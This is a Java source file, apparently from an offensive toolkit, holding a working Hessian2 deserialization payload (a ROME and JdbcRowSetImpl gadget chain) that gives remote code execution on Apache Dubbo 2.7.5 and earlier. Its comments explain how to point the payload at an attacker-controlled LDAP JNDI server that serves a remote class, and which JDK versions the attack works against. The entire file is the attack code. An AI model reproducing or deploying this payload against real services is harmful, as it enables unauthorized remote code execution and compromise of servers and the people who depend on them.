package com.threedr3am.exp.dubbo.payload.hessian;

import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.rowset.JdbcRowSetImpl;
import com.threedr3am.exp.dubbo.payload.Payload;
import com.threedr3am.exp.dubbo.utils.Reflections;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.util.HashMap;

/**
 * dubbo 默认配置，即hessian2反序列化，都可RCE（dubbo版本<=2.7.5）
 *
 * Spring和Spring boot环境下都能打，与Spring版本无关了，仅与dubbo版本有关
 *
 *
 * <dependency>
 *    <groupId>com.rometools</groupId>
 *    <artifactId>rome</artifactId>
 *    <version>1.7.0</version>
 * </dependency>
 *
 * @author threedr3am
 */
public class RomePoc implements Payload {

  private String[] args;

  /**
   *
   * @param args
   *
   * arg[0]=ldap引用外部class地址，例：ldap://127.0.0.1:43658/Calc（ldap协议的JNDI服务可打jdk8u191及以下版本，大于jdk8u191需要使用gadget字节码）
   *
   * @return
   */
  @Override
  public Object getPayload(String[] args) {
    if (this.args != null)
      args = this.args;
    try {
      JdbcRowSetImpl rs = new JdbcRowSetImpl();
      rs.setDataSourceName(args[0]);
      rs.setMatchColumn("foo");
      Reflections.getField(javax.sql.rowset.BaseRowSet.class, "listeners").set(rs, null);

      ToStringBean item = new ToStringBean(JdbcRowSetImpl.class, rs);
      EqualsBean root = new EqualsBean(ToStringBean.class, item);

      HashMap s = new HashMap<>();
      Reflections.setFieldValue(s, "size", 2);
      Class<?> nodeC;
      try {
        nodeC = Class.forName("java.util.HashMap$Node");
      } catch (ClassNotFoundException e) {
        nodeC = Class.forName("java.util.HashMap$Entry");
      }
      Constructor<?> nodeCons = nodeC
          .getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
      nodeCons.setAccessible(true);

      Object tbl = Array.newInstance(nodeC, 2);
      Array.set(tbl, 0, nodeCons.newInstance(0, root, root, null));
      Array.set(tbl, 1, nodeCons.newInstance(0, root, root, null));
      Reflections.setFieldValue(s, "table", tbl);
      return s;
    } catch (Exception e) {
      e.printStackTrace();
    }
    return null;
  }

  @Override
  public void injectDefaultArgs(String[] args) {
    this.args = args;
  }

}
